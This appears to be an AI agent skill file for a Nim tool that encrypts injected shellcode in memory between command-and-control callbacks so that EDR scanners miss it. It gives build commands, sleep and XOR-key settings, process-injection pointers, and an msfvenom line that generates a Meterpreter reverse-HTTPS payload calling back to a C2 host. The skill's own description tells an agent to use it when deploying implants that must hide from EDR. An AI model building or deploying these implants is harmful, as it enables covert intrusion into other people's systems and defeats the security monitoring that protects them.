---
name: nim-shellcode-fluctuation
description: "Nim port of shellcode fluctuation — encrypts injected shellcode in memory between executions to evade memory scanners. Use when deploying implants that must hide from EDR in-memory scanning of RWX regions."
license: MIT
compatibility: "Nim; Windows x64; MSVC or MinGW; github.com/tijme/nim-mangle"
metadata:
  author: AeonDave
  version: "1.0"
---

# Nim Shellcode Fluctuation

Memory evasion — encrypts shellcode (XOR/RC4) in RX pages between C2 callbacks.

## Quick Start

```bash
# Install Nim
# nimble install winim

# Build
nim c -d:release -d:strip --opt:size -o:agent.exe fluctuation.nim

# Inject shellcode (embed in source)
# Replace SHELLCODE placeholder in nim source with msfvenom/Cobalt output
```

## How It Works

1. Shellcode is injected into RX memory
2. Before sleeping: encrypt in-place (XOR/RC4), change page to RW
3. After sleep: decrypt, change page back to RX/RWX
4. EDR memory scans during sleep see only garbage

## Core Configuration

```nim
const SLEEP_MS = 5000       # Sleep between beacons
const XOR_KEY  = 0x41       # Encryption key byte
const FLUCTUATE = true      # Enable/disable fluctuation
```

## Common Workflows

**Generate shellcode and embed:**
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=C2 LPORT=443 -f raw -o shell.bin
# Base64-encode and embed in nim source
python3 -c "import base64; print(base64.b64encode(open('shell.bin','rb').read()).decode())"
```

**Combine with process injection:**
```nim
# Use createRemoteThread or QueueUserAPC for injection
# then enable fluctuation in the injected thread
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | APC injection variants and EDR bypass notes |
